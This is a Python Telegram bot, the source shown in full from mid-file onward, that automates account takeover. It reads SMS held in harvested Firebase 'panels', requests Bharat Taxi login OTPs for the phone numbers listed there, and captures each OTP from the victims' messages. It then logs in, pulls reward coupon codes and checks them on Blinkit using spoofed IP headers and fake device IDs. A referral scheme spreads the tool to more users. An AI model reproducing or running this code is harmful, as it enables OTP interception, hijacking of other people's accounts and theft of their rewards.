        six = re.findall(r'\b(\d{6})\b', body)
        if six:
            return six[0]
    return None


def snapshot_sms_keys(panel_url, device_id, sms_paths=None, phone=None):
    """OTP bhejne se pehle existing SMS ka dedup-key snapshot le lo —
    taaki pehle wali purani SMS OTP na bane."""
    data = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
    return {sms_dedup_key(k, v) for k, v in data.items()} if data else set()


def fetch_otp_from_sms(panel_url, device_id, known_keys=None, timeout=OTP_TIMEOUT,
                       sms_paths=None, phone=None):
    """Fetch OTP from SMS via Firebase REST (multi-path + flatten + outgoing filter)."""
    existing_keys = set(known_keys) if known_keys else set()
    if not existing_keys:
        initial = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
        if initial:
            existing_keys = {sms_dedup_key(k, v) for k, v in initial.items()}
    start_time = time.time()
    while time.time() - start_time < timeout:
        data = fetch_sms(panel_url, device_id, sms_paths, match_number=phone)
        if data:
            for sms_key, sms_value in data.items():
                dkey = sms_dedup_key(sms_key, sms_value)
                if dkey in existing_keys:
                    continue
                existing_keys.add(dkey)
                if is_outgoing_sms(sms_value):
                    continue
                for parsed in flatten_sms(sms_value):
                    otp = extract_bharat_otp(parsed["body"])
                    if otp:
                        return otp
        time.sleep(0.5)
    return None


# ═══════════════════════════════════════════════════════════════
# BHARAT TAXI API
# ═══════════════════════════════════════════════════════════════

def _bharat_headers(token=None):
    headers = {
        "x-rn-version": "--",
        "x-config-version": "0.0.1",
        "x-client-version": BHARAT_CLIENT_VERSION,
        "x-bundle-version": "0.0.10",
        "x-device": "Redmi/Redmi Note 9 Pro Max/Android v12/excalibur/Handset",
        "x-package": BHARAT_APP_PACKAGE,
        "content-type": "application/json",
        "session_id": str(uuid.uuid4()),
        "user-agent": BHARAT_USER_AGENT,
    }
    if token:
        headers["token"] = token
    return headers


def bharat_send_otp(mobile):
    if not BHARAT_SEND_OTP_URL:
        return False, "BHARAT_SEND_OTP_URL missing"
    payload = {
        "merchantId": "BHARAT_TAXI",
        "mobileNumber": mobile,
        "mobileCountryCode": "+91",
        "allowBlockedUserLogin": True,
        "senderHash": "AEdL582H847",
    }
    try:
        resp = requests.post(BHARAT_SEND_OTP_URL, json=payload, headers=_bharat_headers(), timeout=12)
        if resp.status_code in (200, 201, 202):
            try:
                data = resp.json()
            except Exception:
                data = {}
            auth_id = (data.get("authId") if isinstance(data, dict) else None) or None
            if auth_id:
                return True, auth_id
            return False, f"no authId: {resp.text[:120]}"
        return False, f"HTTP {resp.status_code}: {resp.text[:120]}"
    except requests.exceptions.ConnectionError:
        return False, "connection error - api.c2.moving.tech unreachable?"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"


def bharat_verify_otp(auth_id, otp):
    if not BHARAT_VERIFY_OTP_URL:
        return False, "BHARAT_VERIFY_OTP_URL missing"
    payload = {"otp": otp, "deviceToken": "dummy"}
    try:
        resp = requests.post(BHARAT_VERIFY_OTP_URL.format(auth_id=auth_id), json=payload,
                             headers=_bharat_headers(), timeout=12)
        if resp.status_code in (200, 201, 202):
            try:
                data = resp.json()
            except Exception:
                data = {}
            if isinstance(data, dict):
                token = (data.get("token") or data.get("accessToken") or data.get("authToken")
                         or (data.get("data") and isinstance(data["data"], dict) and data["data"].get("token")))
                if token:
                    return True, token
                return False, f"no token: {resp.text[:120]}"
            return False, f"bad response: {resp.text[:120]}"
        return False, f"HTTP {resp.status_code}: {resp.text[:120]}"
    except requests.exceptions.ConnectionError:
        return False, "connection error - api.c2.moving.tech unreachable?"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"


def bharat_fetch_rewards(token):
    if not token:
        return False, None
    try:
        resp = requests.get(BHARAT_REWARDS_URL, headers=_bharat_headers(token), timeout=10)
        if resp.status_code in (200, 201, 202):
            try:
                return True, resp.json()
            except Exception:
                return True, resp.text
        return False, None
    except Exception:
        return False, None


def extract_reward_codes(payload):
    codes = []
    code_keys = ("code", "couponcode", "coupon_code", "coupon", "promocode", "promo_code",
                 "discountcode", "discount_code", "voucher", "amulcode", "amul_code",
                 "rewardcode", "reward_code", "codetext", "vouchercode", "giftcode")
    seen = set()

    def amul_coupon(node):
        if isinstance(node, dict):
            if str(node.get("campaignName", "")) == "AMUL Ice Cream Offer":
                c = node.get("couponCode") or node.get("coupon") or node.get("code")
                if c and str(c).strip():
                    return str(c).strip()
            for v in node.values():
                r = amul_coupon(v)
                if r:
                    return r
        elif isinstance(node, list):
            for item in node:
                r = amul_coupon(item)
                if r:
                    return r
        return None

    amul = amul_coupon(payload)
    if amul:
        return [amul]

    def walk(node):
        if isinstance(node, dict):
            for k, v in node.items():
                if isinstance(v, str) and k.lower() in code_keys and v.strip():
                    clean = v.strip()
                    if clean.upper() not in seen and len(clean) <= 30:
                        seen.add(clean.upper())
                        codes.append(clean)
                walk(v)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(payload)
    if not codes and isinstance(payload, (str, bytes)):
        text = payload if isinstance(payload, str) else payload.decode("utf-8", "ignore")
        m = re.search(r'Reward Code[^:]*:\s*([A-Za-z0-9\-_]+)', text, re.IGNORECASE)
        if m and m.group(1).upper() not in seen:
            codes.append(m.group(1))
    if not codes:
        try:
            text = json.dumps(payload, default=str)
        except Exception:
            text = str(payload)
        found = re.findall(r'\bBLAMUL[A-Z0-9]{6,15}\b', text)
        if not found:
            found = re.findall(r'\bBLA[A-Z0-9]{10,16}\b', text)
        for c in found:
            if c.upper() not in seen:
                seen.add(c.upper())
                codes.append(c)
    return list(dict.fromkeys(codes))


# ═══════════════════════════════════════════════════════════════
# BLINKIT COUPON CHECKER  (blinkitcheck.py port)
# ═══════════════════════════════════════════════════════════════

def _blinkit_session():
    try:
        with open(BLINKIT_SESSION_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _blinkit_save_session(data):
    with _blinkit_lock:
        try:
            with open(BLINKIT_SESSION_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
        except Exception:
            pass


def blinkit_logged_in():
    s = _blinkit_session()
    return bool(s.get("access_token") and s.get("cart_id") and s.get("base_payload"))


def _blinkit_headers(token=None, fixed_device=False):
    rip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    if fixed_device:
        dev_id, sess_uuid, adv_id = _FIXED_DEVICE_ID, _FIXED_SESSION_UUID, _FIXED_ADV_ID
    else:
        dev_id = "".join(random.choices("0123456789abcdef", k=16))
        sess_uuid = str(uuid.uuid4())
        adv_id = str(uuid.uuid4())
    headers = {
        "host_app": "blinkit", "version_name": "18.9.3",
        "app_client": "consumer_android", "app_version": "80180093",
        "version_code": "80180093", "qd_sdk_request": "true",
        "auth_key": "45bff2b1437ff764d5e5b9b292f9771428e18fc40b7f3b7303d196ea84ab4341",
        "qd_sdk_version": "1", "rn_bundle_version": "1009002001",
        "app_api_version": "34", "X-APP-THEME": "default",
        "X-APP-APPEARANCE": "LIGHT", "X-SYSTEM-APPEARANCE": "LIGHT",
        "Accept": "application/json", "screen_density": "1080px",
        "screen_density_num": "3.0", "cpu-level": "AVERAGE",
        "memory-level": "AVERAGE", "storage-level": "EXCELLENT",
        "network-level": "HIGH", "battery-level": "EXCELLENT",
        "is_accessibility_enabled": "false",
        "lat": "24.567459", "lon": "73.69950399999999",
        "screen-width": "360.0", "screen-height": "616.0",
        "entry_source": "default",
        "session_uuid": sess_uuid,
        "device_id": dev_id,
        "advertising_id": adv_id,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "com.grofers.customerapp/280180093 (Linux; U; Android 14; en; SM-X710N; Build/UQ1A.240205.06151050; Cronet/126.0.6452.4)",
        "X-Forwarded-For": rip, "X-Real-IP": rip,
    }
    if token:
        headers["Authorization"] = token
        headers["access_token"] = token
        headers["Content-Type"] = "application/json; charset=UTF-8"
    return headers


def blinkit_request_otp(phone):
    if not CFFI_OK:
        return False, "curl_cffi install nahi hai (pip install curl_cffi)"
    try:
        resp = _cffi_session.post(
            f"{BLINKIT_BASE_URL}/v2/accounts/",
            data=f"country_code=91&otp_mode=SMS&user_phone={phone}&build_variant=release",
            headers=_blinkit_headers(fixed_device=True), timeout=10,
        )
        if resp.status_code != 200:
            return False, f"HTTP {resp.status_code}"
        data = resp.json()
        if data.get("sms_sent"):
            return True, "OTP sent!"
        return False, f"OTP error: {data}"
    except Exception as e:
        return False, str(e)


def blinkit_verify_otp(phone, otp):
    if not CFFI_OK:
        return None, "curl_cffi install nahi hai (pip install curl_cffi)"
    try:
        resp = _cffi_session.post(
            f"{BLINKIT_BASE_URL}/v2/accounts/verify/phone/code/",
            data=(f"country_code=91&otp_mode=SMS&user_phone={phone}&verify_code={otp}"
                  f"&adv_id={_FIXED_ADV_ID}&notification_permission_enabled=false"),
            headers=_blinkit_headers(fixed_device=True), timeout=10,
        )
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        if data.get("success") and "access_token" in data:
            return data["access_token"], "Login Successful!"
        return None, f"Failed: {data}"
    except Exception as e:
        return None, str(e)


def blinkit_get_active_cart(token):
    addr_id = None
    try:
        resp = _cffi_session.get(
            f"{BLINKIT_BASE_URL}/v4/address?source=SOURCE_CART&address_id=-1&is_locality_selected_by_user=false",
            headers=_blinkit_headers(token, fixed_device=True), timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            if data.get("addresses"):
                addr_id = data["addresses"][0]["id"]
    except Exception:
        pass
    try:
        resp = _cffi_session.post(
            f"{BLINKIT_BASE_URL}/v5/carts",
            json={"is_initial_call": True, "cart_type": "product"},
            headers=_blinkit_headers(token, fixed_device=True), timeout=10,
        )
        if resp.status_code == 200:
            cart_id = resp.json().get("cart_id")
            if cart_id and addr_id:
                return cart_id, addr_id
    except Exception:
        pass
    return None, None


def blinkit_check_coupon(coupon, token, cart_id, base_payload):
    """Returns (status, details): VALID | POTENTIAL | INVALID | ERROR"""
    if not CFFI_OK:
        return "ERROR", "curl_cffi missing (pip install curl_cffi)"
    p = base_payload.copy()
    p["promo_codes"] = [coupon]
    url = f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}"
    for attempt in range(3):
        try:
            resp = _cffi_session.patch(url, json=p,
                                       headers=_blinkit_headers(token), timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                promo = data.get("cart_data", {}).get("promo_details", {})
                if promo.get("promo_applied") is True:
                    return "VALID", {"discount": promo.get("discount", 0),
                                     "cashback": promo.get("promo_cashback", 0),
                                     "message": promo.get("message", "")}
                for s in data.get("snippets", []):
                    sl = str(s).lower()
                    if "add items worth" in sl or "more to apply" in sl or "minimum" in sl:
                        return "POTENTIAL", "Cart value zyada chahiye"
                return "INVALID", "Coupon kaam nahi kiya"
            elif resp.status_code == 429:
                time.sleep(3 * (attempt + 1))
                continue
            else:
                return "ERROR", f"HTTP {resp.status_code}"
        except Exception:
            time.sleep(1)
            continue
    return "ERROR", "Max retries - server busy"


def _blinkit_reset_cart(token, cart_id, base_payload):
    try:
        p = base_payload.copy()
        p["promo_codes"] = []
        _cffi_session.patch(f"{BLINKIT_BASE_URL}/v5/carts/{cart_id}",
                            json=p, headers=_blinkit_headers(token), timeout=10)
    except Exception:
        pass


def check_code_with_blinkit(code):
    """Auto-check a code with the admin Blinkit session.
    Returns (status, line) where line is ready for Telegram."""
    if not blinkit_logged_in():
        return "ERROR", "⚠️ Blinkit session not logged in (admin /blinkitlogin)"
    s = _blinkit_session()
    token = s["access_token"]
    cart_id = s["cart_id"]
    base_payload = s.get("base_payload")
    status, details = blinkit_check_coupon(code, token, cart_id, base_payload)
    with _blinkit_lock:
        BLINKIT_STATS["checked"] += 1
        if status == "VALID":
            BLINKIT_STATS["valid"] += 1
            line = (f"✅ <b>VALID</b> 💰 ₹{details['discount']} off"
                    f" | 🪙 CB ₹{details['cashback']}")
            _blinkit_reset_cart(token, cart_id, base_payload)
        elif status == "POTENTIAL":
            BLINKIT_STATS["potential"] += 1
            line = f"⚠️ <b>POTENTIAL</b> - {details}"
        elif status == "INVALID":
            BLINKIT_STATS["invalid"] += 1
            line = "❌ <b>INVALID</b> - coupon kaam nahi kiya"
        else:
            BLINKIT_STATS["errors"] += 1
            line = f"🔴 <b>CHECK ERROR</b> - {details}"
    return status, line


# ═══════════════════════════════════════════════════════════════
# PROGRESS + RUN ENGINE
# ═══════════════════════════════════════════════════════════════

_progress_msgs = {}


def progress(chat_id, text):
    msg_id = _progress_msgs.get(chat_id)
    try:
        if msg_id:
            BOT.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
        else:
            m = BOT.send_message(chat_id, text, parse_mode="HTML")
            _progress_msgs[chat_id] = m.message_id
    except Exception:
        try:
            m = BOT.send_message(chat_id, text, parse_mode="HTML")
            _progress_msgs[chat_id] = m.message_id
        except Exception:
            pass


def _progress_text(label, done, total, lines):
    head = f"🎯 <b>{html.escape(label)}</b> | <code>{done}/{total}</code>"
    block = []
    for line in reversed(lines):
        if len("\n".join(block + [line])) > 3500:
            break
        block.append(line)
    block.reverse()
    if not block:
        return head
    return head + "\n" + "\n".join(block)


def fmt_line(mobile, status, codes=None, device_id=""):
    icon = "✅" if status == "Success" else ("🎁" if status == "Reward" else "❌")
    line = f"{icon} <code>{mobile}</code> - {status}"
    if codes:
        line += f" 🔑 <code>{', '.join(codes[:5])}</code>"
    if device_id:
        line += f"\n  🆔 <code>{device_id}</code>"
    return line


def process_panel(chat_id, user_id, panel_url):
    label = panel_url.split("//")[1][:50] if "//" in panel_url else panel_url
    progress(chat_id, f"🔍 <b>Checking panel...</b>\n<code>{html.escape(label)}</code>")
    panel = check_panel_active(panel_url)
    if not panel:
        progress(chat_id, f"❌ <b>Panel inactive / no numbers</b>\n<code>{html.escape(label)}</code>")
        return
    devices = panel["online_devices"]
    total_nums = panel["total_numbers"]
    progress(chat_id,
             f"📡 <b>Panel Active</b>\n<code>{html.escape(label)}</code>\n"
             f"Devices: {len(devices)} | Numbers: {total_nums}\n\n🔄 Processing...")
    lines = []
    done = 0
    found = []
    for dev in devices:
        dev_id = dev["id"]
        dev_sms_paths = dev.get("sms_paths")
        for mobile in dev["numbers"]:
            done += 1
            new_codes = []
            status = "done"
            known_sms = snapshot_sms_keys(panel_url, dev_id, dev_sms_paths, mobile)
            try:
                ok, auth_id = bharat_send_otp(mobile)
                if not ok:
                    status = f"OTP send fail ({auth_id[:60]})"
                else:
                    otp = fetch_otp_from_sms(panel_url, dev_id, known_keys=known_sms,
                                             timeout=OTP_TIMEOUT, sms_paths=dev_sms_paths, phone=mobile)
                    if not otp:
                        status = "OTP timeout"
                    else:
                        ok, token = bharat_verify_otp(auth_id, otp)
                        if not ok:
                            status = f"Login fail ({token[:60]})"
                        else:
                            ok, rewards = bharat_fetch_rewards(token)
                            new_codes = [c for c in extract_reward_codes(rewards) if not seen_code(c)] if ok else []
                            if new_codes:
                                status = "Reward"
                                for c in new_codes:
                                    check_line = ""
                                    try:
                                        check_status, check_line = check_code_with_blinkit(c)
                                    except Exception:
                                        check_line = ""
                                    msg = (f"🎁 <b>CODE FOUND!</b>\n"
                                           f"📱 <code>{mobile}</code>\n"
                                           f"🔑 <code>{html.escape(c)}</code>\n"
                                           f"📡 <code>{html.escape(panel_url[:50])}</code>")
                                    if check_line:
                                        msg += f"\n🛒 <b>Blinkit Check:</b> {check_line}"
                                    progress(chat_id, msg)
                                found.extend(new_codes)
                            else:
                                status = "Success"
            except Exception as exc:
                status = f"Error: {type(exc).__name__}"
            lines.append(fmt_line(mobile, status, new_codes, dev_id))
            log_result(user_id, panel_url, dev_id, mobile, status, new_codes)
            progress(chat_id, _progress_text(label, done, total_nums, lines))
            time.sleep(NUMBER_DELAY)
    summary = (
        f"📊 <b>Panel Done</b>\n<code>{html.escape(label)}</code>\n"
        f"Processed: {done}/{total_nums} | 🎁 Codes: {len(found)}"
    )
    if found:
        summary += "\n🔑 " + ", ".join(f"<code>{html.escape(c)}</code>" for c in found[:10])
    summary += "\n\n🏠 menu ke liye /start"
    progress(chat_id, summary)


def run_all(chat_id, user_id):
    panels = get_user_panels(user_id)
    if not panels:
        progress(chat_id, "❌ <b>Koi panel add nahi hai.</b>\n➕ Pehle panel add karo.")
        return
    total, used = user_slots(user_id)
    progress(chat_id, f"🚀 <b>RUNNING {len(panels)} PANELS</b>\nSlots: {slots_display(used, total)}\n\n➡️ Ek ek kar ke...")
    for i, url in enumerate(panels):
        process_panel(chat_id, user_id, url)
        if i < len(panels) - 1:
            time.sleep(PANEL_DELAY)


# ═══════════════════════════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════════════════════════

PANEL_URL_RE = re.compile(
    r"https?://[^\s,\"'<>]+?(?:firebaseio\.com|firebasedatabase\.app)[^\s,\"'<>]*",
    re.IGNORECASE,
)


def extract_urls(text):
    urls = []
    for m in PANEL_URL_RE.finditer(text or ""):
        url = m.group(0).rstrip(".,;)")
        if url not in urls:
            urls.append(url)
    return urls


@BOT.message_handler(commands=["start"])
def cmd_start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or ""
    first = message.from_user.first_name or ""
    ref = None
    if len(message.text.split()) > 1:
        ref = message.text.split()[1].strip().upper()

    new = ensure_user(user_id, username, first)
    if new and ref and ref != get_user(user_id)[3]:
        referrer = find_user(ref)
        if referrer and referrer[0] != user_id:
            if add_referral(referrer[0], user_id):
                try:
                    BOT.send_message(
                        referrer[0],
                        f"🎉 <b>NEW REFERRAL!</b>\n\n"
                        f"👤 {html.escape(first or username or 'Someone')} joined via your link!\n"
                        f"➕ <b>+1 Firebase slot</b> mila hai.\n\n"
                        f"🧾 Total referrals: <b>{referrer[5] + 1}</b>"
                        f"{FOOTER}",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
    check_and_reply(chat_id, user_id)


@BOT.message_handler(commands=["help"])
def cmd_help(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not has_joined(user_id) and not is_admin(user_id):
        send_force_join(chat_id)
        return
    BOT.send_message(
        chat_id,
        f"{BRAND} - <b>HELP</b>\n\n"
        f"1️⃣ <b>ADD PANEL</b> ➜ Firebase URL bhejo. Jitne referrals hai utne panels add kar sakte ho.\n"
        f"2️⃣ <b>RUN CODES</b> ➜ Apne panels ke saare numbers par OTP -> login -> reward code.\n"
        f"3️⃣ <b>REFER & EARN</b> ➜ 1 referral = 1 extra panel slot. Bulk add allowed.\n"
        f"4️⃣ <b>MY STATS</b> ➜ Apna poora record.\n\n"
        f"🔒 Dono channel join karna zaroori hai." + FOOTER,
        parse_mode="HTML",
        reply_markup=back_home_markup(),
    )


@BOT.message_handler(content_types=["document"])
def handle_doc(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not has_joined(user_id) and not is_admin(user_id):
        send_force_join(chat_id)
        return
    doc = message.document
    if not doc or not (doc.file_name or "").lower().endswith(".txt"):
        BOT.reply_to(message, "Sirf <b>.txt</b> file bhejo.", parse_mode="HTML")
        return
    try:
        file_info = BOT.get_file(doc.file_id)
        text = BOT.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    except Exception as exc:
        BOT.reply_to(message, f"❌ File read error: {exc}")
        return
    urls = extract_urls(text)
    if not urls:
        BOT.reply_to(message, "❌ File mein koi Firebase URL nahi mila.", parse_mode="HTML")
        return
    check_panels_bulk(chat_id, user_id, urls, "TXT FILE")


@BOT.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not has_joined(user_id) and not is_admin(user_id):
        send_force_join(chat_id)
        return
    if message.text and message.text.startswith("/"):
        return
    urls = extract_urls(message.text)
    if urls:
        handle_urls(chat_id, user_id, urls)
    else:
        BOT.reply_to(message, "❌ Firebase URL nahi mila.\n📂 <b>ADD PANEL</b> dabao ya URL paste karo.",
                     parse_mode="HTML", reply_markup=home_markup(is_admin(user_id)))


def handle_urls(chat_id, user_id, urls):
    total, used = user_slots(user_id)
    available = max(0, total - used)
    if available <= 0:
        BOT.send_message(
            chat_id,
            f"❌ <b>No slots left!</b>\n\n"
            f"📂 Used: {slots_display(used, total)}\n"
            f"🔗 <b>REFER & EARN</b> se naye slots pao (1 refer = 1 slot).\n\n"
            f"Bulk add: jitne referral utne panels ek sath daal sakte ho.",
            parse_mode="HTML",
            reply_markup=back_home_markup(),
        )
        return
    added, rejected, avail = add_panels(user_id, urls)
    reply_add_result(chat_id, user_id, added, rejected)


def reply_add_result(chat_id, user_id, added, rejected):
    total, used = user_slots(user_id)
    msg = f"✅ <b>PANELS ADDED</b>\n\n"
    if added:
        msg += "📂 <b>Added:</b>\n" + "\n".join(
            f"✅ <code>{html.escape(u[:50])}</code>" for u in added[:10])
        if len(added) > 10:
            msg += f"\n... +{len(added) - 10} aur"
        msg += "\n\n"
    if rejected:
        msg += f"❌ <b>Rejected (duplicate/no slot):</b> {len(rejected)}\n"
    msg += f"📊 Slots: <b>{slots_display(used, total)}</b>\n\n"
    msg += "🎯 RUN CODES dabao ab!"
    BOT.send_message(chat_id, msg, parse_mode="HTML",
                     reply_markup=home_markup(is_admin(user_id)))


# ═══════════════════════════════════════════════════════════════
# CALLBACKS
# ═══════════════════════════════════════════════════════════════

@BOT.callback_query_handler(func=lambda c: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data
    try:
        BOT.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        BOT.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
    try:
        if data == "check_join":
            check_and_reply(chat_id, user_id)
        elif data == "home":
            send_home(chat_id, user_id)
        elif data == "add_panel":
            cb_add_panel(chat_id, user_id)
        elif data == "check_panels":
            cb_check_panels(chat_id, user_id)
        elif data == "check_my_panels":
            cb_check_my_panels(chat_id, user_id)
        elif data == "check_txt":
            cb_check_txt(chat_id, user_id)
        elif data == "add_active":
            cb_add_checked(chat_id, user_id, "active")
        elif data == "add_all_checked":
            cb_add_checked(chat_id, user_id, "all")
        elif data == "run_menu":
            cb_run_menu(chat_id, user_id)
        elif data == "run_all":
            cb_run_all(chat_id, user_id)
        elif data == "my_stats":
            cb_my_stats(chat_id, user_id)
        elif data == "refer":
            cb_refer(chat_id, user_id)
        elif data == "admin_menu":
            cb_admin_menu(chat_id, user_id)
        elif data.startswith("runpanel|"):
            url = data.split("|", 1)[1]
            cb_run_panel(chat_id, user_id, url)
        elif data == "admin_users":
            cb_admin_users(chat_id, user_id)
        elif data == "admin_codes":
            cb_admin_codes(chat_id, user_id)
        elif data == "admin_top":
            cb_admin_top(chat_id, user_id)
        elif data == "admin_access":
            cb_admin_access(chat_id, user_id)
        elif data == "blinkit_menu":
            cb_blinkit_menu(chat_id, user_id)
        elif data == "blinkit_login":
            _start_blinkit_login(chat_id)
    except Exception as exc:
        try:
            BOT.send_message(chat_id, f"❌ Error: {exc}", parse_mode="HTML")
        except Exception:
            pass


def cb_add_panel(chat_id, user_id):
    total, used = user_slots(user_id)
    if used >= total:
        BOT.send_message(
            chat_id,
            f"❌ <b>No slots left!</b>\n\n"
            f"📂 {slots_display(used, total)} slots used.\n"
            f"🔗 <b>REFER & EARN</b> ➜ 1 referral = 1 panel slot.\n"
            f"Bulk add possible: jitne referrals utne panels ek sath.",
            parse_mode="HTML",
            reply_markup=home_markup(is_admin(user_id)),
        )
        return
    BOT.send_message(
        chat_id,
        f"📂 <b>ADD PANEL</b>\n\n"
        f"Apna Firebase URL bhejo — turant add ho jayega.\n"
        f"<b>.txt file</b> upload karo to pehle sab URLs check honge (free), phir ADD kar sakte ho.\n\n"
        f"📊 Current: <b>{slots_display(used, total)}</b> slots\n\n"
        f"Example:\n<code>https://yourpanel.firebaseio.com</code>",
        parse_mode="HTML",
        reply_markup=back_home_markup(),
    )


def cb_check_panels(chat_id, user_id):
    panels = get_user_panels(user_id)
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn(f"📂 MY PANELS ({len(panels)})", "check_my_panels", style="primary", icon=EMO_BLUE))
    kb.add(btn("📄 CHECK TXT FILE", "check_txt", style="success", icon=EMO_GREEN))
    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
    BOT.send_message(
        chat_id,
        f"🔎 <b>CHECK PANELS</b>\n\n"
        f"Sabhi panels check karo — kaun sa <b>ACTIVE</b>, kaun sa <b>INACTIVE</b>.\n"
        f"✅ <b>Free</b> — koi limit nahi!\n\n"
        f"📂 Saved panels check karo ya .txt file bhejo (bulk).",
        parse_mode="HTML",
        reply_markup=kb,
    )


def cb_check_my_panels(chat_id, user_id):
    panels = get_user_panels(user_id)
    if not panels:
        BOT.send_message(
            chat_id,
            f"❌ <b>Koi panel nahi hai.</b>\n\n📂 ADD PANEL se panel add karo ya txt file check karo.",
            parse_mode="HTML",
            reply_markup=home_markup(is_admin(user_id)),
        )
        return
    check_panels_bulk(chat_id, user_id, panels, "MY PANELS")


def cb_check_txt(chat_id, user_id):
    BOT.send_message(
        chat_id,
        f"📄 <b>CHECK TXT FILE</b>\n\n"
        f"Apni Firebase URLs wali <b>.txt</b> file bhejo — sab check honge (ACTIVE/INACTIVE).\n"
        f"✅ <b>Free</b> — koi limit nahi.",
        parse_mode="HTML",
        reply_markup=back_home_markup(),
    )


def cb_add_checked(chat_id, user_id, which):
    cache = _check_cache.pop(user_id, {})
    urls = cache.get(which, [])
    if not urls:
        BOT.send_message(
            chat_id,
            f"❌ Koi panel cache nahi hai. Pehle 🔎 CHECK PANELS chalao.",
            parse_mode="HTML",
            reply_markup=home_markup(is_admin(user_id)),
        )
        return
    added, rejected, _ = add_panels(user_id, urls)
    reply_add_result(chat_id, user_id, added, rejected)


def cb_run_menu(chat_id, user_id):
    panels = get_user_panels(user_id)
    if not panels:
        BOT.send_message(
            chat_id,
            f"❌ <b>Koi panel nahi hai.</b>\n\n📂 ADD PANEL se pehle panel add karo.",
            parse_mode="HTML",
            reply_markup=home_markup(is_admin(user_id)),
        )
        return
    if user_id in _processing:
        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai. Pehle khatam hone do.",
                         parse_mode="HTML")
        return
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(btn(f"🚀 RUN ALL ({len(panels)})", "run_all", style="success", icon=EMO_GREEN))
    for i, url in enumerate(panels[:12]):
        tag = url.split("//")[1][:38] if "//" in url else url
        kb.add(btn(f"📡 {i + 1}. {tag}", f"runpanel|{url}", style="primary", icon=EMO_BLUE))
    if len(panels) > 12:
        kb.add(btn(f"➕ +{len(panels) - 12} aur panels", "run_all", style="primary", icon=EMO_BLUE))
    kb.add(btn("🏠 HOME", "home", style="danger", icon=EMO_RED))
    BOT.send_message(
        chat_id,
        f"🎯 <b>RUN CODES</b>\n\nApne {len(panels)} panels mein se select karo, ya RUN ALL:",
        parse_mode="HTML",
        reply_markup=kb,
    )


def cb_run_all(chat_id, user_id):
    if user_id in _processing:
        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai.", parse_mode="HTML")
        return
    _processing.add(user_id)
    try:
        run_all(chat_id, user_id)
    except Exception as exc:
        try:
            BOT.send_message(chat_id, f"❌ Job error: {exc}", parse_mode="HTML")
        except Exception:
            pass
    finally:
        _processing.discard(user_id)


def cb_run_panel(chat_id, user_id, url):
    if user_id in _processing:
        BOT.send_message(chat_id, "⏳ Ek job already chal rahi hai.", parse_mode="HTML")
        return
    _processing.add(user_id)
    try:
        process_panel(chat_id, user_id, url)
    except Exception as exc:
        try:
            BOT.send_message(chat_id, f"❌ Job error: {exc}", parse_mode="HTML")
        except Exception:
            pass
    finally:
        _processing.discard(user_id)


def cb_my_stats(chat_id, user_id):
    u = get_user(user_id)
    if not u:
        send_home(chat_id, user_id)
        return
    total, used = user_slots(user_id)
    with _db_lock:
        con = _db()
        try:
            rows = con.execute(
                "SELECT status, COUNT(*) FROM results WHERE user_id=? GROUP BY status", (user_id,)).fetchall()
            total_codes = u[7]
        finally:
            con.close()
    status_line = " | ".join(f"{s}: {c}" for s, c in rows) or "No runs yet"
    BOT.send_message(
        chat_id,
        f"{BRAND} - <b>MY STATS</b>\n\n"
        f"👤 Name: <b>{html.escape(u[2] or 'user')}</b>\n"
        f"🔗 Refer Link: <code>https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={u[3]}</code>\n"
        f"📂 Panels: <b>{slots_display(used, total)}</b>\n"
        f"👥 Referrals: <b>{u[5]}</b>\n"
        f"➕ Free slots: <b>{u[6]}</b>\n"
        f"🎁 Codes found: <b>{total_codes}</b>\n\n"
        f"📊 Runs: {status_line}" + FOOTER,
        parse_mode="HTML",
        reply_markup=home_markup(is_admin(user_id)),
    )


def cb_refer(chat_id, user_id):
    u = get_user(user_id)
    if not u:
        send_home(chat_id, user_id)
        return
    code = u[3]
    link = f"https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={code}"
    total, used = user_slots(user_id)
    BOT.send_message(
        chat_id,
        f"🔗 <b>REFER & EARN</b>\n\n"
        f"💰 <b>1 referral = 1 Firebase slot</b>\n\n"
        f"Ye link share karo:\n<code>{link}</code>\n\n"
        f"📤 Share button se copy karo 👇\n\n"
        f"👥 Referrals: <b>{u[5]}</b>\n"
        f"📂 Slots: <b>{slots_display(used, total)}</b>\n"
        f"🧮 <b>Bulk add:</b> {u[5]} referrals = {u[5]} panels ek sath add kar sakte ho.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(row_width=1).add(
            url_btn("📤 SHARE LINK", f"https://t.me/share/url?url={link}&text=🚕%20Join%20VIEDIET%20Panel%20Master%20%E2%80%94%20earn%20free%20codes!",
                    style="success", icon=EMO_GREEN),
            btn("🏠 HOME", "home", style="primary", icon=EMO_BLUE),
        ),
        disable_web_page_preview=True,
    )


